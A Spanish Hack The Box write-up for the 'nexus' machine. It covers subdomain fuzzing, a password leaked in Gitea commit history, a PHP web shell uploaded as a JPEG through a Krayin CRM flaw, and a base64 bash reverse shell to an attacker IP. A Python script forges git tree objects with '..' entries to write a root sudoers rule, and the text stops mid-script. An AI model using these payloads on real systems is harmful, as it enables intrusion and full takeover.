# <font color=red>[+]</font> Reconocimiento

```bash
sudo nmap -p- -Pn -n -sS -vvv --min-rate 5000 $IP

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

```bash
sudo namp -p22,80 -Pn -n -sVC --min-rate 5000 -oN versiones.nmap $IP

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

En el reconocimiento de scripts por defecto que realiza `nmap` al puerto `80` vemos que se nos redirige al dominio `nexus.htb`. Por lo que debemos de añadir dicho dominio al archivo `/etc/hosts`.

```bash
sudo vim /etc/hosts

$IP    nexus.htb
```

## <font color=red>[~]</font> Entorno web

Si realizamos una consulta HTTP GET usando `curl` podemos ver el código fuente de la página directamente en nuestra terminal. Veremos que parece ser una web estática sin mucha funcionalidad de lo que parece ser una empresa encargada del mantenimiento eléctrico.

La página web no contiene mucha información relevante, no obstante podemos encontrar un script al final que se encarga de gestionar una *ventana modal*.

>[!Note]
>*Una ventana modal es un* ***cajón o diálogo que se superpone sobre la página*** *, bloqueando la interacción con el resto del contenido hasta que el usuario lo cierra.*
>
>*Suele usarse para mostrar información, formularios o confirmaciones sin redirigir a otra página.*

Si miramos el elemento `div` con `id="jobModal"`, encontramos la dirección de correo electrónico del *gerente de contratación* de la empresa.

```
j.matthew@nexus.htb
```

Si miramos la página a través de un navegador podemos ver la *ventana modal* pulsando en el botón `View role ->` del final de la página.

![[ventana modal.png|700]]

### <font color=red>[#]</font> Fuzzing

Tras revisar exhaustivamente la página web y no encontrar más información, decidimos pasar a la fase de enumeración activa del entorno web realizando ***Fuzzing*** contra el dominio.

```bash
# Enumeración de endpoints
ffuf -c -w <(tail -n+15 /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt) -u http://nexus.htb/FUZZ -fc 404

ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://nexus.htb/FUZZ -fc 404

# Enumeración de directorios
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://nexus.htb/FUZZ -fc 404
```

No conseguimos encontrar nada interesante. Por lo que pasamos a la ***enumeración de subdominios***. Para ello podemos usar la misma herramienta `ffuf` de la siguiente forma:

```bash
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://nexus.htb -H "Host: FUZZ.nexus.htb" -fc 404

localhost               [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 52ms]
whm                     [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 54ms]
webdisk                 [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 54ms]
admin                   [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 53ms]
mx                      [Status: 302, Size: 154, Words: 4, Lines: 8, Duration: 53ms]

<snip>
```

No obstante, si ejecutamos la herramienta con esta configuración veremos que se nos muestra mucho ruido de muchos supuestos subdominios válidos. Si nos fijamos en la respuesta de estos supuestos subdominios nos damos cuenta de que todos tienen el mismo ***código de estado***, mismo ***tamaño (`154`)***, mismas ***letras (`4`)*** y mismas ***líneas (`8`)***.

>[!important]
>*En entornos reales, que un dominio responda a cualquier subdominio suele involucrar dos capas: un **DNS Wildcard** (que resuelve cualquier subdominio a una misma IP) y un **Virtual Host por defecto** en el servidor web. Dado que estamos en un entorno de Hack The Box donde la resolución local se hace vía `/etc/hosts` y no hay servidores DNS públicos, este comportamiento recae exclusivamente en la capa de aplicación web.*
>
>***Mecanismo técnico***
>- ***Capa DNS (Wildcard DNS):*** El dominio tiene configurado un registro comodín (`*.dominio.htb IN A <IP>`). Cualquier consulta hacia un subdominio inexistente (por ejemplo, `random123.dominio.com`) resuelve automáticamente a la misma dirección IP en lugar de arrojar `NXDOMAIN`. ***ESTO NO OCURRE EN NUESTRA MÁQUINA YA QUE NO SE ENCUENTRA EN NINGÚN SERVIDOR DNS***.
>- ***Capa Web (Default / Fallback Virtual Host):*** El servidor (Nginx, Apache, IIS o un reverse proxy/CDN como *Cloudflare*) no tiene un bloque de servidor específico para ese subdominio en el encabezado `Host`. En su lugar, atiende la petición con el Virtual Host configurado por defecto, devolviendo siempre el mismo código HTTP (habitualmente `200 OK` o `301/302`) y el mismo contenido HTML/hash base.
>
>***Impacto y metodología de fingerprinting***
>En una fase de reconocimiento, esta configuración puede generar ***falsos positivos masivos*** si se ejecutan herramientas de fuzzing de subdominios (`ffuf`, `gobuster`, `amass`) sin calibración.
>
>Para caracterizarlo y filtrar el ruido en nuestro writeup, se suele elegir este flujo:
>
>1. ***Prueba de control (Baseline Request):*** Realizar un reconocimiento de subdominios inicial en la que consultemos una par de subdominios inexistentes.
>2. ***Extracción de la firma estándar:*** Analizar la respuesta devuelta para identificar su huella estática.
>3. ***Filtrado activo durante el fuzzing:*** Configurar herramientas para descartar dinámicamente cualquier respuesta que coincida con esa firma.

>[!Note]
>De esta forma, si añadimos uno de los subdominios al archivo `/etc/hosts` y después tratamos de hacer una consulta al mismo obtendremos la siguiente respuesta:
>
>```HTTP
>curl -s http://localhost.nexus.htb -i
>
>HTTP/1.1 302 Moved Temporarily
>Server: nginx/1.24.0 (Ubuntu)
>Date: Wed, 09 Sep 2026 12:43:18 GMT
>Content-Type: text/html
>Content-Length: 154
>Connection: keep-alive
>Location: http://nexus.htb/
>
><html>
><head><title>302 Found</title></head>
><body>
><center><h1>302 Found</h1></center>
><hr><center>nginx/1.24.0 (Ubuntu)</center>
></body>
></html>
>```
>
>Vemos como se nos redirige al dominio principal `nexus.htb`.

Como hemos visto, todas las respuestas por defecto tienen el mismo tamaño, por lo que podemos aprovecharlo para tratar de filtrar y que tan solo se nos muestre aquellas respuestas que tengan un tamaño diferente a `154`:

```bash
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://nexus.htb -H "Host: FUZZ.nexus.htb" -fc 404 -fs 154

git                     [Status: 200, Size: 14474, Words: 1195, Lines: 242, Duration: 81ms]
billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 2895ms]
```

>***BINGO!*** Acabamos de encontrar dos supuestos subdominios reales. Para poder acceder a ellos, recordemos que debemos añadirlos en el archivo `/etc/hosts` junto al dominio principal:

```
10.129.92.122 	nexus.htb billing.nexus.htb git.nexus.htb
```

### <font color=red>[#]</font> `billing.nexus.htb`

>Al acceder a este subdominio, se nos redirige automáticamente a un formulario de inicio de sesión.

Este formulario tiene también una funcionalidad de recuperación de contraseña en el cual debemos de introducir un email qué esté registrado en la aplicación.

Además, podemos ver que la aplicación que se utiliza en este subdominio se llama ***Krayin***, por lo que podemos tratar de buscar vulnerabilidades conocidas.

Más allá de esto, no podemos hacer mucho además de tratar de realizar ataques de inyección SQL/NoSQL o fuerza bruta, los cuales son ataques muy agresivos. Por lo que investiguemos el resto de la superficie de ataque antes de actividades así.

### <font color=red>[#]</font> `git.nexus.htb`

En este subdominio corre una instancia de ***Gitea***, el cual es una plataforma de control de versiones ***Gti*** autohospedada (*self-hosted*), de código abierto. En términos sencillos es como tener nuestro propio ***GitHub*** o ***GitLab*** privado, pero funcionando dentro de nuestra propia máquina o servidor.

>***[Explicación](#gitea)***

Dentro de ***Gitea***, si vamos al apartado ***Explore***, podremos ver el repositorio del contenedor ***Docker*** que corre ***Krayin***.

Dentro del repositorio encontramos un archivo `.env` en el que podemos ver unas variables de entorno que se usan para que funcione el contenedor. Lo que más nos interesa son las variables de entorno relacionadas con la base de datos. Podemos ver un usuario `krayin` pero no podemos ver la contraseña ya que esta aparece sin la misma:

```
DB_USERNAME=krayin
DB_PASSWORD=
```

Aunque parezca que no podemos hacer nada más, vemos que existen ***dos commits***. Por lo que es posible que en el primer commit se hubiera filtrado esta contraseña y el administrador del contenedor lo haya borrado en el segundo commit.

>[!important]
>*En **Git**, los commits no funcionan guardando únicamente el estado final de una carpeta, sino que registran un **historial inmutable de cambios**.*
>
>*Cuando se sube información sensible (como una contraseña o una clave de API) en un commit y posteriormente se realiza otro commit borrándola o modificando el archivo:*
>
>- ***El dato desaparece del árbol de trabajo actual (`HEAD`), pero permanece intacto en los objetos del historial.***
>- *Cualquier usuario con acceso al repositorio puede inspeccionar los commits anteriores mediante comandos como `git log -p`, `git diff` o simplemente navegando por el historial de cambios en la interfaz web (GitHub, GitLab, Gitea).
>- *Gitea almacena cada versión de los archivos en forma de objetos (blobs). Mientras ese commit antiguo exista en el árbol de commits, la información sensible seguirá siendo completamente legible y recuperable.*
>
>***Solución real:***
>*Para eliminarlo de verdad es obligatorio **reescribir el historial de Git** (eliminando las referencias al objeto mediante herramientas como `git filter-repo` o `BFG Repo-Cleaner`) y forzar la actualización del repositorio remoto (`git push --force`). aun así, en un entorno de producción, una credencial expuesta en un commit debe considerarse **comprometida de inmediato** y ser revocada o rotada.*

Para ver el primer *commit* podemos pulsar en el botón `2 Commits` de la interfaz web de Gitea. Dentro veremos los dos commits que se han realizado; el que nos interesa es el último `1615c...`.

```
DB_USERNAME=krayin
DB_PASSWORD=[hidden]
```

Si tuviera más contenido y nos costase ver que se ha modificado en el siguiente *commit*, podemos hacer clic cobre el hash identificador del *commit* actual y se nos mostraría las diferencias en formato DIFF:

```DIFF
- APP_URL=http://nexus.htb
+ APP_URL=http://billing.nexus.htb

- DB_PASSWORD=[hidden]
+ DB_PASSWORD=
```

### <font color=red>[#]</font> `billing.nexus.htb` (Continuación)

>Con la contraseña que hemos exfiltrado del *commit* y el email que encontramos en la ventana modal del dominio principal, podemos acceder al ***dashboard de Krayin***.

Es el momento de ver que es realmente ***Krayin***: ***[Explicación](#krayin)***.

Dentro del *dashboard* podemos ver que la versión de Krayin que estamos usando es la versión `2.2.0` (*en el icono de usuario arriba a la derecha*). Con esta información podemos buscar vulnerabilidades públicas que podamos explotar.

# <font color=red>[+]</font> Explotación

>***[CVE-2026-38526](https://socradar.io/blog/cve-2026-38526-krayin-crm-rce/)***
>
>***[Explicación](#cve-2026-38526)***

Una vez obtenemos acceso, podemos explotar la vulnerabilidad anterior la cual consiste en subir un archivo `.php` con una web shell haciéndolo pasar por una imagen `.jpeg`.

>[!warning]
>Para ello:
>
>1. Creamos el archivo malicioso que nos permitirá crear la web shell:
>```php
><?php
>	system($_GET["cmd"]);
>?>
>```
>
>2. Subimos el archivo malicioso:
>```bash
>curl -s -X POST http://billing.nexus.htb/admin/tinymce/upload \
>-b cookies.txt \
>-F "file=@shell.php;type=image/jpeg" -i
>```
>
>```HTTP
>HTTP/1.1 419 unknown status
>Server: nginx/1.24.0 (Ubuntu)
>Content-Type: text/html; charset=utf-8
>Transfer-Encoding: chunked
>Connection: keep-alive
>Cache-Control: no-cache, private
>date: Fri, 11 Sep 2026 13:44:36 GMT
>phpdebugbar-id: 01M28BD24D4ZG3WTGCDYC7F1QB
>Set-Cookie: krayin_crm_session=eyJpdiI6IjA3WHh5RFM3SlFJdUtXVzA0Lzh2aHc9PSIsInZhbHVlIjoiMXZzS1NNd1k5NFNsZGxXdEhrSnhLeXRBSWtBaGhsM1VUcEI5T2NaQUNzb012aUpiY1FJcDNhNk1ob2xMYTEzVE5zRXdtVWl5b1l4NXM3SjJZMFJJWUgrcjdYanRFaVBJMW84d1Z2ZjQyU2lNRERmeTl4VkFDYm5KT3NwdEtLS0wiLCJtYWMiOiI5YzM3N2E4MGYyMjViN2Q0N2I5ZjE2ODk3NTFjY2QzYjgxY2JjYTZmY2E0MDhjMmQ3MmYyNjE3ZDBlN2Q4OTdhIiwidGFnIjoiIn0%3D; expires=Fri, 11 Sep 2026 15:44:36 GMT; Max-Age=7200; path=/; httponly; samesite=lax
>```
>
>Hemos obtenido un código de estado `419 unknown status`. Esto es debido a que al intentar enviar una petición que modifica el estado del servidor (`POST`, `PUT`, `DELETE`, como ocurre en el *endpoint* de subida de archivos) sin la cabecera `X-CSRF-TOKEN` o `X-XSRF-TOKEN`, Krayin CRM (al estar desarrollado en ***Laravel***) interrumpe la ejecución y devuelve un código de estado `HTTP 419`.
>
>***Por qué ocurre esto?***
>
>- ***Mecanismo de defensa predeterminado:*** El framework ***Laravel*** implementa de serie el middleware `VerifyCsrfToken` en todas las rutas web para prevenir ataques de Falsificación de Peticiones entre sitios Cruzados (CSRF).
>- ***Validación cruzada:*** Por cada sesión, Laravel genera un token único que envía al navegador cliente. Cuando se realiza una petición de escritura, el servidor exige que ese mismo valor sea devuelto obligatoriamente a través de la cabecera HTTP correspondiente.
>- ***Rechazo preventivo:*** Si la cabecera no se incluye en la solicitud, el middleware detecta la discrepancia o ausencia, invalida la sesión de la petición de inmediato y bloquea la ejecución antes de que el archivo malicioso llegue a ser procesado por el controlador.
>   
>Por lo que para que podamos hacer la petición, primero debemos tomar el valor del token CSRF. Para ello, realizamos una consulta `GET` al *endpoint* `/admin/dashboard` y filtramos la palabra `_token` usando `grep`:
>```bash
>curl -s http://billing.nexus.htb/admin/dashboard \
>-b cookies.txt | grep -i "csrf\|token"
>
><input type="hidden" name="_token" value="7jgm5czjwvsGoDl7nlrNJIkARCeWZJ2lNkYn0Dzd" autocomplete="off">
>```
>
>Una vez tenemos todo lo necesario, subimos el archivo malicioso:
>```bash
>curl -s -X POST http://billing.nexus.htb/admin/tinymce/upload \
>-b cookies.txt \
>-H "X-CSRF-TOKEN: 7jgm5czjwvsGoDl7nlrNJIkARCeWZJ2lNkYn0Dzd" \
>-F "file=@shell.php;type=image/jpeg" -i
>
>{"location":"http:\/\/billing.nexus.htb\/storage\/tinymce\/7085eac039926fc692361a3e78bdd502.php"}
>```

Ahora, si navegamos al *endpoint* usando nuestro navegador, podremos ejecutar comandos del sistema operativo a través del parámetro `?cmd=` de la URL:


![[rce.png]]

Ahora que contamos con ejecución remota de código en el servidor, podemos ejecutar una reverse Shell desde la víctima hacia nuestra máquina atacante. Para ello:

- Codificamos el *payload* en ***base64***: Los caracteres especiales como `/`, `&` o símbolos de redirección tienen significados sintácticos reservados en las URLs y en los protocolos HTTP. Si un *payload* se envía en texto plano a través de un parámetro como `cmd`, el servidor web o el navegador interpretarán esos caracteres como separadores de variables, alterando o truncando la instrucción antes de que llegue a la web shell.
   
   Codificar el *payload* en ***Base64*** lo transforma en una cadena puramente alfanumérica que reduce significativamente estos conflictos. De este modo, la cadena viaja intacta a través de la petición HTTP y, al ser recibida, la web shell la decodifica y ejecuta de forma transparente garantizando que la estructura del comando no sufra alteraciones.
   
   ```bash
   echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/IP_KALI/4444 0>&1"' | base64 | sed 's/+/%2B/g; s/\//%2F/g; s/=/%3D/g'
   ```

>[!important]
>Usamos `sed` ya que el código en ***Base64*** puede seguir conteniendo algunos caracteres conflictivos, por lo que usamos `sed` para pasar dichos caracteres a su formato ***Percent-encoding***.

Una vez tengamos el código en ***Base64***, podemos construir la secuencia de comandos que nos permitirá ejecutar el código del *payload*. Dependiendo de la herramienta que usemos deberemos de preparar la secuencia de comandos de una forma u otra:

1. ***Desde el navegador web:*** Podemos usar el navegador para ejecutar la secuencia de comandos directamente:
   
   ```
   http://billing.nexus.htb/storage/tinymce/7085eac039926fc692361a3e78bdd502.php?cmd=echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTg5LzQ0NDQgMD4mMSIK | base64 -d | bash
   ```
   
   El navegador se encargará de transformar los espacios en su formato ***Percent-encoding*** (`%20`), por lo que no tenemos que preocuparnos por ello.

2. ***Usando `curl`:*** Si usamos `curl` para enviar la petición `HTTP GET` con la misma secuencia de comandos que usamos en el navegador web, se nos mostrará un mensaje de error:
   
   ```
   * URL rejected: Malformed input to a URL function
* closing connection #-1
   ```
   
   Esto se debe a que `curl` no transforma la URL, por lo que al no ser una URL válida directamente cancela la petición. para solucionarlo tan solo debemos de transformar los espacios en `+` o `%20` usando la herramienta `tr`:
   
   ```bash
   echo 'http://billing.nexus.htb/storage//tinymce//7085eac039926fc692361a3e78bdd502.php?cmd=echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTg5LzQ0NDQgMD4mMSIK | base64 -d | bash' | tr ' ' '+'
   
   http://billing.nexus.htb/storage/tinymce/7085eac039926fc692361a3e78bdd502.php?cmd=echo+L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTg5LzQ0NDQgMD4mMSIK+|+base64+-d+|+bash
   ```
   
   >Ahora podremos usar esta URL con `curl` sin ningún problema.
   
Una vez tengamos la petición lista, levantaremos un *listener* en el mismo puerto que especificamos en el *payload* (`4444`):

```bash
nc -lvnp 4444
```

Por último, realizaremos la petición *HTTP GET* con la URL que preparamos antes:

```bash
curl -s 'http://billing.nexus.htb/storage/tinymce/7085eac039926fc692361a3e78bdd502.php?cmd=echo+L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMTg5LzQ0NDQgMD4mMSIK+|+base64+-d+|+bash'
```

# <font color=red>[+]</font> Post-Explotación

## <font color=red>[~]</font> Tratamiento de la Shell

Como de costumbre, con la reverse shell obtenemos una pseudoshell incompleta y muy tedioso para trabajar. Para mejorarla seguiremos los siguientes pasos:

```bash
# 1. Creamos una nueva shell Bash sin almacenar registros
scripts -c bash /dev/null

# 2. Configuramos nuestra terminal en la máquina atacante para que funcione correctamente y volvemos a la shell remota
CTRL+Z
stty raw -echo && fg

# 3. Exportamos las variables de entorno necesarias
export TERM=xterm
export PS1="\u$ "

# 4. Le indicamos a la Shell remota cual es la configuración de tamaño de nuestro emulador de terminal

# En una nueva ventana de terminal en nuestra máquina atacante
stty -a 

speed 38400 baud; rows 36; columns 172; line = 0;
<snip>

# Tomamos los valores de rows y columns

# En la shell remota le indicamos el número de fils (rows) y columnas (columns)
stty rows 36 columns 172
```

## <font color=red>[~]</font> Enumeración del servidor

### <font color=red>[#]</font> Usuarios con Shell

Lo primero que debemos revisar al obtener acceso al sistema es que usuarios existen en el mismo. Para ello veremos el archivo `/etc/passwd` y filtraremos para ver los únicos que cuentas con shell:

```bash
awk -F: '$7 ~ /\/.*sh$/ {print $0}' /etc/passwd

root:x:0:0:root:/root:/bin/bash
jones:x:1000:1000:,,,:/home/jones:/bin/bash
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
```

>Encontramos 3 usuarios con Shell, de los cuales uno es el usuario `root`, por lo que nos quedamos de momento con `jones` y `git`.

Si revisamos los directorios `/home` de los usuarios nos encontramos con que no tenemos ningún permiso para ninguno de ellos:

```bash
ls -la /home

drwxr-x---  2 git   git   4096 May 12 12:27 git
drwxr-x---  3 jones jones 4096 May 12 12:26 jones
```

Si enumeramos los ejecutables con el ***Bit SUID activo*** tampoco encontramos nada de interés. Y los puertos en escucha nos confirma que existe una instancia de MySQL corriendo en el puerto `3306` de la máquina escuchando únicamente desde la dirección `localhost`.

```bash
ss -tuln

Netid            State             Recv-Q            Send-Q                       Local Address:Port                        Peer Address:Port            Process            
udp              UNCONN            0                 0                               127.0.0.54:53                               0.0.0.0:*                                  
udp              UNCONN            0                 0                            127.0.0.53%lo:53                               0.0.0.0:*                                  
udp              UNCONN            0                 0                                  0.0.0.0:68                               0.0.0.0:*                                  
tcp              LISTEN            0                 4096                            127.0.0.54:53                               0.0.0.0:*                                  
tcp              LISTEN            0                 151                              127.0.0.1:3306                             0.0.0.0:*                                  
tcp              LISTEN            0                 4096                               0.0.0.0:22                               0.0.0.0:*                                  
tcp              LISTEN            0                 511                                0.0.0.0:80                               0.0.0.0:*                                  
tcp              LISTEN            0                 4096                         127.0.0.53%lo:53                               0.0.0.0:*                                  
tcp              LISTEN            0                 70                               127.0.0.1:33060                            0.0.0.0:*                                  
tcp              LISTEN            0                 4096                             127.0.0.1:3000                             0.0.0.0:*                                  
tcp              LISTEN            0                 4096                                  [::]:22                                  [::]:*                                  
tcp              LISTEN            0                 511                                   [::]:80                                  [::]:*
```

El puerto `3000` es donde corre la instancia de ***Gitea*** que vimos en el reconocimiento del entorno web.

### <font color=red>[#]</font> MySQL

Ahora que sabemos que existe una instancia de MySQL corriendo en el puerto `3306` podemos tratar de acceder con las credenciales que encontramos antes en el repositorio de ***Gitea***.

```bash
mysql -h localhost -u krayin -p
Enter password:

ERROR 1045 (28000): Access denied for user 'krayin'@'localhost' (using password: YES)
```

Parece ser que no son las credenciales correctas, por lo que nos tocará seguir investigando. Y eso me hace pensar en que tal vez pueda encontrar algún otro archivo `.env` con variables de entorno en el sistema.

```bash
find / -name "*.env" 2>/dev/null

/var/www/krayin/.env
```

Si miramos el contenido de este archivo `.env` descubrimos que no es el mismo que vimos en la instancia de ***Gitea***, y contiene unas nuevas credenciales. Si tratamos de conectarnos a la instancia de MySQL usando estas nuevas credenciales obtenemos acceso.

Una vez dentro de la instancia, no encontramos nada de interés. Por lo que pienso en que tal vez uno de los usuarios haya reusado la misma contraseña.

```bash
su jones

jones@nexus:/var/www/krayin/storage/app/public/tinymce$
```

***Bingo!*** Tenemos la contraseña del usuario `jones`. Y aunque ya tenemos una shell con el usuario `jones` (la que se crea al usar `su` y cambiar de usuario), creemos una conexión remota vía SSH que es más estable y cómoda que la reverse shell. Primero veamos si es posible acceder a vía SSH usando contraseñas:

```bash
grep -i 'passwordauthentication' ./* 2>/dev/null
./ssh_config:#   PasswordAuthentication yes
./sshd_config:#PasswordAuthentication yes
./sshd_config:# PasswordAuthentication.  Depending on your PAM configuration,
./sshd_config:# PAM authentication, then enable this but set PasswordAuthentication
```

Parece que sí, ya que todo lo que encontramos son directivas ***comentadas***, y en la mayoría de versiones de ***OpenSSH*** el valor por defecto para esta directiva es `yes`.

```bash
ssh jones@nexus.htb

jones@nexus:~$
```

### <font color=red>[#]</font> Escalada de privilegios de `jones` a `root`

Después de estar investigando el sistema manualmente, se me ocurrió mirar los ***timers*** de systemd por si hubiera algún servicio interesante que se ejecutase cada poco tiempo:

```bash
systemctl list-timers

Fri 2026-09-11 15:16:30 UTC        3s Fri 2026-09-11 15:15:30 UTC      56s ago gitea-template-sync.timer      gitea-template-sync.service
<snip>
```

En esta línea del *output* podemos ver que existe un servicio `gitea-template-sync.service` que se ejecuta cada `60 segundos`.

Si vemos que hace el servicio con `systemctl status gitea-template-sync.service`:

```bash
systemctl status gitea-template-sync.service 
○ gitea-template-sync.service - Sync Gitea templates
     Loaded: loaded (/etc/systemd/system/gitea-template-sync.service; static)
     Active: inactive (dead) since Fri 2026-09-11 15:29:31 UTC; 22s ago
TriggeredBy: ● gitea-template-sync.timer
    Process: 2810 ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py (code=exited, status=0/SUCCESS)
   Main PID: 2810 (code=exited, status=0/SUCCESS)
        CPU: 98ms
```

Vemos que está ejecutando un script de Python en `/etc/gitea/template-sync.py`. si vemos los permisos del archivo vemos que tenemos permisos de lectura sobre el mismo:

```Python
import os
import sys
import json
import subprocess
import time
import urllib.request

GITEA_URL = "http://localhost:3000"
REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
STAGING_DIR = "/home/git/template-staging"
LOG_FILE = "/var/log/template-sync.log"

def log(msg):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    line = "[%s] %s" % (ts, msg)
    print(line, flush=True)
    try:
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
        with open(LOG_FILE, 'a') as f:
            f.write(line + '\n')
    except:
        pass

def load_config():
    config = {}
    for path in ['/etc/gitea/template-sync.conf', '/opt/forge/app/.env']:
        try:
            with open(path) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#') and '=' in line:
                        k, v = line.split('=', 1)
                        config[k.strip()] = v.strip()
        except:
            pass
    return config

def get_token():
    cfg = load_config()
    return cfg.get('GITEA_API_TOKEN')

def get_template_repos(token):
    url = "%s/api/v1/repos/search?limit=50" % GITEA_URL
    req = urllib.request.Request(url, headers={
        'Authorization': 'token %s' % token
    })
    try:
        with urllib.request.urlopen(req) as resp:
            data = json.loads(resp.read())
            repos = data.get('data', data) if isinstance(data, dict) else data
            return [r for r in repos if r.get('template', False)]
    except Exception as e:
        log("API error: %s" % e)
        return []

def sync_template(repo_info):
    owner = repo_info['owner']['login']
    name = repo_info['name'].lower()
    bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)
    stage_path = os.path.join(STAGING_DIR, owner, name)

    if not os.path.isdir(bare_path):
        log("  repo not found: %s" % bare_path)
        return

    # Read tree entries from the bare repository
    try:
        GIT = ['git', '-c', 'safe.directory=*']
        result = subprocess.run(
            GIT + ['ls-tree', '-r', 'HEAD'],
            cwd=bare_path,
            capture_output=True, text=True, timeout=10
        )
        if result.returncode != 0:
            log("  ls-tree failed: %s" % result.stderr.strip())
            return
    except Exception as e:
        log("  ls-tree error: %s" % e)
        return

    entries = []
    for line in result.stdout.strip().split('\n'):
        if not line:
            continue
        parts = line.split('\t', 1)
        if len(parts) != 2:
            continue
        meta, filepath = parts
        mode, objtype, objhash = meta.split()
        if objtype == 'blob':
            entries.append((mode, objhash, filepath))

    if not entries:
        log("  no files in template")
        return

    # Extract files to staging directory
    for mode, objhash, filepath in entries:
        target = os.path.join(stage_path, filepath)
        target_dir = os.path.dirname(target)

        try:
            os.makedirs(target_dir, exist_ok=True)
            GIT = ['git', '-c', 'safe.directory=*']
            cat_result = subprocess.run(
                GIT + ['cat-file', 'blob', objhash],
                cwd=bare_path,
                capture_output=True, timeout=10
            )
            if cat_result.returncode != 0:
                continue

            with open(target, 'wb') as f:
                f.write(cat_result.stdout)

            if mode == '100755':
                os.chmod(target, 0o755)
            else:
                os.chmod(target, 0o644)

            log("  synced: %s" % filepath)
        except Exception as e:
            log("  error syncing %s: %s" % (filepath, e))

def main():
    log("Template sync starting")

    token = get_token()
    if not token:
        log("No API token found")
        sys.exit(1)

    templates = get_template_repos(token)
    log("Found %d template repo(s)" % len(templates))

    for repo in templates:
        name = repo['full_name']
        log("Syncing template: %s" % name)
        sync_template(repo)

    log("Template sync complete")

if __name__ == '__main__':
    main()
```

>***[Explicación del Script](#template-sync.py)***

Este script contiene una vulnerabilidad de ***Path Traversal*** debido al método `join()` de `os.path`.

```python
target = os.path.join(stage_path, filepath)
# ...
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, 'wb') as f:
    f.write(cat_result.stdout)
```

>La idea es crear archivos cuto nombre contenga los caracteres `../` (que en Linux significa subir de directorio) para poder controlar el archivo que realmente se escribirá.

No obstante, ***Git*** desde la versión `2.35` rechaza rutas con segmentos `..` al agregarlas al *index*. Sin embargo, esta validación ***solo aplica al index***. Los *tree objects* no pasan por esta validación si los escribimos manualmente.

>[!Note]
>En la arquitectura de Git, un _tree object_ actúa como un directorio clásico: almacena una lista de elementos definidos por su modo, nombre y hash. La clave de esta vulnerabilidad radica en que Git acepta prácticamente cualquier cadena en el campo "nombre", con la única restricción de que no contenga barras (`/`). Esto significa que nombrar un _tree_ literalmente como `..` es completamente válido a nivel interno.
>
>El problema detona al invocar el comando `git ls-tree -r`. Como este comando aplana toda la jerarquía del repositorio para mostrar rutas completas, Git concatena automáticamente el nombre de cada nivel utilizando `/`. Si estructuramos a mano una cadena de _tree objects_ anidados llamados `..`, engañamos a Git para que ensamble y valide nuestro _path traversal_.
>
>A nivel estructural, el árbol malicioso se vería así:
>
>```
>[tree raíz]
 >├── README.md         (blob)
 >└── ..                (tree)
>     └── ..            (tree)
>         └── ..        (tree)  ← (Iteramos para escapar del directorio de staging)
>             └── etc         (tree)
>                 └── sudoers.d (tree)
>                     └── pwn   (blob)  ← Nuestro payload con la regla de sudo
>```
>
>Al aplanarlo, ***Git*** produce: `../../../etc/sudoers.d/pwn`.

```python
#!/usr/bin/env python3
import hashlib, os, zlib, time

def write_obj(data, t):
    h = ("%s %d" % (t, len(data))).encode() + b"\x00"
    s = h + data
    sha = hashlib.sha1(s).hexdigest()
    d = os.path.join(".git", "objects", sha[:2])
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, sha[2:])
    if not os.path.exists(p):
        open(p, "wb").write(zlib.compress(s))
    return sha

def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)

# La regla de sudo que nos dará root sin contraseña
payload = b'jones ALL=(ALL) NOPASSWD: ALL\n'
payload_blob = write_obj(payload, "blob")

# Construimos etc/sudoers.d/pwn con tres niveles de tree
sudoers_t   = write_obj(entry("100644", "pwn", payload_blob), "tree")
sudoers_d_t = write_obj(entry("40000", "sudoers.d", sudoers_t), "tree")
etc_t       = write_obj(entry("40000", "etc", sudoers_d_t), "tree")

# Envolvemos en cinco niveles de ".." para escapar del staging
cur = etc_t
for _ in range(5):
    cur = write_obj(entry("40000", "..", cur), "tree")

# Tree raíz: un README (para que parezca una plantilla normal) + un ".." más
root = write_obj(
    entry("100644", "README.md", write_obj(b"# pwn\n", "blob")) + entry("40000", "..", cur),
    "tree",
)

ts = int(time.time())
commit = ("tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"
          % (root, ts, ts)).encode()
sha = write_obj(commit, "commit")

